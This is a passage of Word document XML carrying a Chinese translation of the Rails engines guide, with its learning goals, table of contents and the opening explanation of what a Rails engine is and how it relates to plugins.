            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Engine 入门</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="251531B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在这个教程中你将会学习关于 engine（的知识）以及如何使用它们从而保证其额外的功能能够通过一个干净，易用的接口到它们的宿主程序（host applications）。在这个教程中你将学习如下内容：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3920EEC1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="235"/>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Engine 的产生</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F744193" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="235"/>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怎样去创建一个 engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A04679C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="235"/>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为 engine 构建特性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4607C940" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="235"/>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衔接 engine 到一个应用程序中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C08693" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="235"/>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在应用程序中覆盖 engine 的功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF78593"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CC3FE0" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId974" w:anchor="1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Engine 是什么？</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73BB6EBB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId975" w:anchor="2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建一个 engine</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7893ED86" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId976" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>进入一个 Engine</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E0C159B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId977" w:anchor="3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>为 engine 提供功能</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10A5B2C1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId978" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建一个 post 资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FC7489E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId979" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建一个 comments 资源</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B399935" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId980" w:anchor="4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hooking into an application 衔接到一个应用程序中</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4BB76EDA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId981" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>挂载 engine</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="572490EA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId982" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>安装 engine</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="30D8342E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId983" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>（在 engine 中）使用一个被应用程序提供的类</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="71569403" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId984" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>配置一个 engine</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="217925FC" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId985" w:anchor="5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Testing an engine</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FB307CB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId986" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Functional tests</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="523EC904" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId987" w:anchor="6" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Improving engine functionality</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DB2893A" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId988" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Overriding views</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="554749B0" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId989" w:anchor="6-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Routes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2AE2DA0D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId990" w:anchor="6-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Assets</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BD3FAE4" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId991" w:anchor="6-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Separate Assets &amp; Precompiling</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E4CD252" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="236"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId992" w:anchor="6-5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Other gem dependencies</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="142D774C"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1 Engine 是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F465A7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Engine 可以被看作是（一个）微型的应用程序其提供（一些额外的）功能给它们的宿主程序（host applications）。一个 Rails 应用程序实际上就是一个 “加强版”（supercharged） engine，因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 继承了来自 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的更多习惯。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3909D92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因此，engine 和应用程序可以被认为是几乎相同的事物，仅仅有一些次要的不同，正如你贯穿这个教程将会发现的。Engine 和应用程序也共享了一个通用的结构。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DD91E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Engines 也与 plugin 关联紧密这里有两点（说明）共享了一个通用的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录结构以及都是使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails plugin new</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建器来创建的。不同之处是一个明确指定了 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--full</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
